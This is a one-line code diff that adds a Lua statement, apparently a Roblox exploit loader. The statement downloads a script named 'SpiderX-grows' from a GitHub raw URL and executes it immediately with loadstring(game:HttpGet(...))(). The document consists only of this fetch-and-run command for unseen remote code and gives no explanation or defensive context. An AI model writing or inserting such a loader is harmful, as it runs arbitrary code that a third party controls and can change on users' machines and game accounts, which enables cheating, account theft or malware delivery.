@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://github.com/MrTheSec/SpiderX/raw/refs/heads/main/SpiderX-grows"))()
